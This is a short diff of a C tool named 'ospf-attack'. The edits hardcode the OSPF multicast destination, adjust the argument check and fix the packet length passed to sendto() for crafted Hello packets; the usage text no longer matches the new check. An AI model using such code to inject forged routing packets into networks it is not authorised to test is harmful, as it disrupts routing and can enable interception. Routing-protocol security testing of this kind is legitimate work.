@@ -21,7 +21,7 @@ unsigned char *parse_ip_addr(char *ip_str);
 extern int errno;
 
 int main(int argc, char *argv[]) {
-  if (argc != 7) {
+  if (argc != 5) {
     printf("Usage: ospf-attack INTERFACE INTERFACE_NUMBER LOCAL_MAC_ADDR LOCAL_IP_ADDR DESTINATION_MAC_ADDR DESTINATION_IP_ADDR\n\n");
     exit(1);
   }
@@ -36,11 +36,11 @@ int main(int argc, char *argv[]) {
   char *local_mac_str   = argv[3];
   char *local_ip        = argv[4];
   char *dest_mac_str    = argv[5];
-  char *dest_ip         = argv[6];
+  char *dest_ip         = "224.0.0.5"; //argv[6];
 
   // Convert input to bytes
   unsigned char *local_mac = parse_mac_addr(local_mac_str);
-  unsigned char *dest_mac  = parse_mac_addr(dest_mac_str);
+  unsigned char *dest_mac  = parse_mac_addr("01:00:5e:00:00:05");
   int iface_index = atoi(iface_index_str);
 
   // This helps us identify our requests
@@ -60,7 +60,7 @@ int main(int argc, char *argv[]) {
 
   int packet_len = build_hello(buffer, local_mac, local_ip, dest_mac, dest_ip);
 
-  if((ret_value = sendto(sock_fd, buffer, 64, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
+  if((ret_value = sendto(sock_fd, buffer, packet_len, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
     printf("ERROR! sendto() \n");
     exit(1);
   }
